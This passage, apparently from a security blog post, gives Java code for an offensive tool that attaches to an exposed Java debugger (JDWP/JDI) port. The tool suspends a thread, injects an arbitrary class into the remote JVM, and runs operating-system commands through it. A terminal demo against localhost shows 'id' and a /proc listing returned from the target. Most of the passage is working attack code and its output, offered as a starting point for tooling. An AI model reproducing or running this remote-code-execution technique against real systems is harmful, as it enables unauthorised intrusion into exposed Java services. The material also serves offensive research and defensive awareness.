+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalStateException(<span style=color:#e6db74>&#34;No executable locations in method: &#34;</span> <span style=color:#f92672>+</span> method.<span style=color:#a6e22e>name</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        Location loc <span style=color:#f92672>=</span> locs.<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        BreakpointRequest bp <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>vm</span>.<span style=color:#a6e22e>eventRequestManager</span>().<span style=color:#a6e22e>createBreakpointRequest</span>(loc);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// warning!</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Don&#39;t be dumb like me and suspend all threads!</span>
+</span></span><span style=display:flex><span>        bp.<span style=color:#a6e22e>setSuspendPolicy</span>(EventRequest.<span style=color:#a6e22e>SUSPEND_EVENT_THREAD</span>);
+</span></span><span style=display:flex><span>        bp.<span style=color:#a6e22e>enable</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Breakpoint set at %s.%s%s%n&#34;</span>, className, methodName,
+</span></span><span style=display:flex><span>                (signature <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> signature : <span style=color:#e6db74>&#34;&#34;</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (<span style=color:#66d9ef>true</span>) {
+</span></span><span style=display:flex><span>            EventSet eventSet <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>vm</span>.<span style=color:#a6e22e>eventQueue</span>().<span style=color:#a6e22e>remove</span>();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (Event event : eventSet) {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (event <span style=color:#66d9ef>instanceof</span> BreakpointEvent) {
+</span></span><span style=display:flex><span>                    BreakpointEvent be <span style=color:#f92672>=</span> (BreakpointEvent) event;
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>SuspendedThread</span> <span style=color:#f92672>=</span> be.<span style=color:#a6e22e>thread</span>();
+</span></span><span style=display:flex><span>                    <span style=color:#75715e>// for whatever reason the thread wasn&#39;t always suspended</span>
+</span></span><span style=display:flex><span>                    <span style=color:#75715e>// I should probably check the suspend count here before re-suspending</span>
+</span></span><span style=display:flex><span>                    <span style=color:#75715e>// *hand waving* this is a PoC</span>
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>SuspendedThread</span>.<span style=color:#a6e22e>suspend</span>();
+</span></span><span style=display:flex><span>                    
+</span></span><span style=display:flex><span>                    System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[+] Breakpoint hit by thread: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>SuspendedThread</span>.<span style=color:#a6e22e>name</span>());
+</span></span><span style=display:flex><span>                    eventSet.<span style=color:#a6e22e>resume</span>();
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>            eventSet.<span style=color:#a6e22e>resume</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>After calling this method, we SHOULD have a reference to a remotely suspended thread.</p><p>Once we do, we need to use JDI to inject our class into the remote VM using the path to our compiled payload class:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>InjectClass</span>(String filename, String className) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> classBytes <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            classBytes <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(filename));
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IOException e) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[-] Error reading file\n\t&#34;</span> <span style=color:#f92672>+</span> e.<span style=color:#a6e22e>getMessage</span>());
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (SuspendedThread <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span>SuspendedThread.<span style=color:#a6e22e>isSuspended</span>()) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[-] Target thread is null or not suspended!&#34;</span>);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalStateException(<span style=color:#e6db74>&#34;Thread is not suspended.&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// get ClassLoader.defineClass([BII) method</span>
+</span></span><span style=display:flex><span>        ReferenceType classLoaderClass <span style=color:#f92672>=</span> vm.<span style=color:#a6e22e>classesByName</span>(<span style=color:#e6db74>&#34;java.lang.ClassLoader&#34;</span>).<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>        Method defineClassMethod <span style=color:#f92672>=</span> classLoaderClass.<span style=color:#a6e22e>methodsByName</span>(<span style=color:#e6db74>&#34;defineClass&#34;</span>, <span style=color:#e6db74>&#34;([BII)Ljava/lang/Class;&#34;</span>).<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// find a live ClassLoader instance</span>
+</span></span><span style=display:flex><span>        ObjectReference classLoader <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (ReferenceType refType : vm.<span style=color:#a6e22e>allClasses</span>()) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>                ObjectReference candidate <span style=color:#f92672>=</span> refType.<span style=color:#a6e22e>classLoader</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (candidate <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>                    classLoader <span style=color:#f92672>=</span> candidate;
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (Exception ignored) {
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (classLoader <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[-] No class loader found&#34;</span>);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// create remote byte[] of class contents</span>
+</span></span><span style=display:flex><span>        ArrayType byteArrayType <span style=color:#f92672>=</span> (ArrayType) vm.<span style=color:#a6e22e>classesByName</span>(<span style=color:#e6db74>&#34;byte[]&#34;</span>).<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>        ArrayReference remoteBytes <span style=color:#f92672>=</span> byteArrayType.<span style=color:#a6e22e>newInstance</span>(classBytes.<span style=color:#a6e22e>length</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>Value<span style=color:#f92672>&gt;</span> values <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList<span style=color:#f92672>&lt;&gt;</span>(classBytes.<span style=color:#a6e22e>length</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>byte</span> b : classBytes) {
+</span></span><span style=display:flex><span>            values.<span style=color:#a6e22e>add</span>(vm.<span style=color:#a6e22e>mirrorOf</span>(b));
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            remoteBytes.<span style=color:#a6e22e>setValues</span>(values);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (InvalidTypeException e) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException(e);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (ClassNotLoadedException e) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException(e);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            classLoader.<span style=color:#a6e22e>invokeMethod</span>(
+</span></span><span style=display:flex><span>                    SuspendedThread,
+</span></span><span style=display:flex><span>                    defineClassMethod,
+</span></span><span style=display:flex><span>                    List.<span style=color:#a6e22e>of</span>(remoteBytes, vm.<span style=color:#a6e22e>mirrorOf</span>(0), vm.<span style=color:#a6e22e>mirrorOf</span>(classBytes.<span style=color:#a6e22e>length</span>)),
+</span></span><span style=display:flex><span>                    ObjectReference.<span style=color:#a6e22e>INVOKE_SINGLE_THREADED</span>
+</span></span><span style=display:flex><span>            );
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception ex) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[-] Error invoking classLoader.defineClass()\n\t&#34;</span> <span style=color:#f92672>+</span> ex.<span style=color:#a6e22e>getMessage</span>());
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// force load into the loaded class list</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// if we don&#39;t do this, we will be unable to reference the class we injected</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            ClassType classClass <span style=color:#f92672>=</span> (ClassType) vm.<span style=color:#a6e22e>classesByName</span>(<span style=color:#e6db74>&#34;java.lang.Class&#34;</span>).<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            Method forName <span style=color:#f92672>=</span> classClass.<span style=color:#a6e22e>methodsByName</span>(
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;forName&#34;</span>,
+</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;&#34;</span>
+</span></span><span style=display:flex><span>            ).<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            classClass.<span style=color:#a6e22e>invokeMethod</span>(
+</span></span><span style=display:flex><span>                    SuspendedThread,
+</span></span><span style=display:flex><span>                    forName,
+</span></span><span style=display:flex><span>                    List.<span style=color:#a6e22e>of</span>(
+</span></span><span style=display:flex><span>                            vm.<span style=color:#a6e22e>mirrorOf</span>(className),
+</span></span><span style=display:flex><span>                            vm.<span style=color:#a6e22e>mirrorOf</span>(<span style=color:#66d9ef>true</span>),
+</span></span><span style=display:flex><span>                            classLoader
+</span></span><span style=display:flex><span>                    ),
+</span></span><span style=display:flex><span>                    ObjectReference.<span style=color:#a6e22e>INVOKE_SINGLE_THREADED</span>
+</span></span><span style=display:flex><span>            );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[+] Successfully forced class load via Class.forName(name, true, loader)&#34;</span>);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[-] Failed to force class load: &#34;</span> <span style=color:#f92672>+</span> e.<span style=color:#a6e22e>getMessage</span>());
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>You MUST use the FQN class name when injecting.</p><p>Finally, now that our class is injected into the remote VM and inserted into the loaded class list, we can invoke any static method in our class like so:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>RunRemoteCommand</span>(String cmd) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (SuspendedThread <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span>SuspendedThread.<span style=color:#a6e22e>isSuspended</span>()) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalStateException(<span style=color:#e6db74>&#34;Suspended thread is null or not suspended&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>ReferenceType<span style=color:#f92672>&gt;</span> matches <span style=color:#f92672>=</span> vm.<span style=color:#a6e22e>classesByName</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>className</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (matches.<span style=color:#a6e22e>isEmpty</span>()) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalStateException(<span style=color:#e6db74>&#34;Injected class &#34;</span> <span style=color:#f92672>+</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>className</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; not found in remote VM&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ClassType injectedClass <span style=color:#f92672>=</span> (ClassType) matches.<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Method executeMethod <span style=color:#f92672>=</span> injectedClass.<span style=color:#a6e22e>methodsByName</span>(
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;ExecuteCommand&#34;</span>,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;(Ljava/lang/String;)Ljava/lang/String;&#34;</span>
+</span></span><span style=display:flex><span>        ).<span style=color:#a6e22e>get</span>(0);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Value result <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> injectedClass.<span style=color:#a6e22e>invokeMethod</span>(
+</span></span><span style=display:flex><span>                    SuspendedThread,
+</span></span><span style=display:flex><span>                    executeMethod,
+</span></span><span style=display:flex><span>                    List.<span style=color:#a6e22e>of</span>(vm.<span style=color:#a6e22e>mirrorOf</span>(cmd)),
+</span></span><span style=display:flex><span>                    ObjectReference.<span style=color:#a6e22e>INVOKE_SINGLE_THREADED</span>
+</span></span><span style=display:flex><span>            );
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e){
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>stdout</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[-] Something horrible has happened! Oh no!\n&#34;</span> <span style=color:#f92672>+</span> e)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        String res <span style=color:#f92672>=</span> ((StringReference) result).<span style=color:#a6e22e>value</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> res;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>Putting this all together in a red-eye late-night developed, somewhat janky tool:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>mike@host:~/IdeaProjects/Beanhive$ java -jar ./target/Beanhive-1.0-SNAPSHOT.jar -h 127.0.0.1 -p <span style=color:#ae81ff>1234</span> -c target/classes/org/example/Vastatrix4.class -n org.example.Vastatrix4 -b sun.net.httpserver.FixedLengthOutputStream.close
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Successfully connected to remote JDI
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> Attempting to break on sun.net.httpserver.FixedLengthOutputStream.close<span style=color:#f92672>()</span>V
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Breakpoint set at sun.net.httpserver.FixedLengthOutputStream.close<span style=color:#f92672>()</span>V
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Breakpoint hit by thread: HTTP-Dispatcher
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Breakpoint hit successfully on thread
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> Attempting to inject class <span style=color:#e6db74>&#34;org.example.Vastatrix4&#34;</span> into remote JVM
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Successfully forced class load via Class.forName<span style=color:#f92672>(</span>name, true, loader<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Successfully injected class <span style=color:#e6db74>&#34;org.example.Vastatrix4&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>]</span>&gt;id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span>,4<span style=color:#f92672>(</span>adm<span style=color:#f92672>)</span>,24<span style=color:#f92672>(</span>cdrom<span style=color:#f92672>)</span>,27<span style=color:#f92672>(</span>sudo<span style=color:#f92672>)</span>,30<span style=color:#f92672>(</span>dip<span style=color:#f92672>)</span>,46<span style=color:#f92672>(</span>plugdev<span style=color:#f92672>)</span>,100<span style=color:#f92672>(</span>users<span style=color:#f92672>)</span>,114<span style=color:#f92672>(</span>lpadmin<span style=color:#f92672>)</span>,984<span style=color:#f92672>(</span>docker<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>]</span>&gt;ls -la /proc
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x <span style=color:#ae81ff>547</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 .
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>23</span> root                 root                            <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>29</span> 10:38 ..
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>100</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 17:58 <span style=color:#ae81ff>100060</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 17:58 <span style=color:#ae81ff>100096</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> mike                 mike                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 17:57 <span style=color:#ae81ff>100103</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> mike                 mike                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 17:57 <span style=color:#ae81ff>100120</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> mike                 mike                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 17:57 <span style=color:#ae81ff>100169</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> mike                 mike                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 17:58 <span style=color:#ae81ff>100223</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 18:00 <span style=color:#ae81ff>100555</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> mike                 mike                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 18:01 <span style=color:#ae81ff>100947</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> mike                 mike                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 18:01 <span style=color:#ae81ff>100948</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> mike                 mike                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 18:01 <span style=color:#ae81ff>100953</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> avahi                avahi                              <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>1013</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> messagebus           messagebus                         <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>1014</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> gnome-remote-desktop gnome-remote-desktop               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>1017</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>102</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>1020</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>18</span> 18:10 <span style=color:#ae81ff>102030</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>103</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> polkitd              polkitd                            <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>1030</span>
+</span></span><span style=display:flex><span>dr-xr-xr-x   <span style=color:#ae81ff>9</span> root                 root                               <span style=color:#ae81ff>0</span> Aug <span style=color:#ae81ff>15</span> 20:13 <span style=color:#ae81ff>1032</span>
+</span></span></code></pre></div><p>The code can be viewed <a href=https://github.com/alfarom256/jditinker>here</a>, and serves only as a potential alternative to existing tools and starting point for your tooling should you extend this project.</p><p>YMMV</p></div><p class="cmd end"><span class=usr>mike@malicious.dev</span>:<span class=pth>~/posts</span>$ <span class=cursor aria-hidden=true></span></p></div></div></article><script src=/js/post.js defer></script></main></div></body></html>
